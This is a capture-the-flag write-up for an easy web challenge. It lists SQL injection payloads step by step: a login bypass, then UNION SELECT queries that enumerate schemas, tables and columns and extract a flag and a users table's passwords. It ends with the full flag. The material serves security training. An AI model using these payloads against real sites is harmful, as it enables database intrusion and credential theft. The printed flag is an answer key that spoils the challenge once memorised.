# error=-330

#### Category: Web Exploitation

#### Difficulty: Easy

#### Type: Black Box

#### Description: You don’t ask for access. You carve it out.

#### Author: AndraB

#### Preview: 

![image](https://github.com/user-attachments/assets/2fa0c368-21f5-43fb-a181-4aad60473bcf)

## Solution
<details>

![image](https://github.com/user-attachments/assets/b92cd9a1-4456-4701-a99d-50baf30292f4)

`' OR 1=1--`

![image](https://github.com/user-attachments/assets/bdb616dc-c00c-419e-a90c-4b89ef75920d)

`' UNION SELECT NULL,NULL,NULL,schema_name FROM information_schema.schemata-- -`

![image](https://github.com/user-attachments/assets/cebcad6e-8c4d-47a9-bd93-f05d039d8f9b)

`sqli_challenge` and `password_reset`

`' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables WHERE table_schema='sqli_challenge' -- -`

![image](https://github.com/user-attachments/assets/8fde99eb-25d0-4d1e-be8d-3fc027546846)

`' UNION SELECT NULL,NULL,NULL,column_name FROM information_schema.columns WHERE table_schema='sqli_challenge' AND table_name='secrets' -- -`

![image](https://github.com/user-attachments/assets/ad07e830-85b3-4f2e-9308-4927af6bbbe3)

`' UNION SELECT NULL,NULL,NULL,flag FROM sqli_challenge.secrets-- -`

![image](https://github.com/user-attachments/assets/0acccc85-a447-4d66-9a66-e1cae136e70e)

#### Part 1 : `UVT{Th3_sy5t3M_7ru5Ts_1tS_oWn_9r4Mmar_..._`

`' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables WHERE table_schema='password_reset'-- -`

![image](https://github.com/user-attachments/assets/491c5a34-85c8-44a4-815b-bafada399132)

`' UNION SELECT NULL,NULL,NULL,column_name FROM information_schema.columns WHERE table_schema='password_reset' AND table_name='users'-- -`

![image](https://github.com/user-attachments/assets/abe1f29a-3d7e-4ae6-9704-c16825e729af)

`' UNION SELECT NULL,NULL,NULL,password FROM password_reset.users-- -`

![image](https://github.com/user-attachments/assets/ea22609b-3cdb-4a6f-adbe-c8f9065cee51)

#### Part 2: `S0_5tR1ng5_4r3_m0r3_tHaN_qu3r13s_1n_th3_3nd}`

#### Flag
> UVT{Th3_sy5t3M_7ru5Ts_1tS_oWn_9r4Mmar_..._S0_5tR1ng5_4r3_m0r3_tHaN_qu3r13s_1n_th3_3nd}

</details>
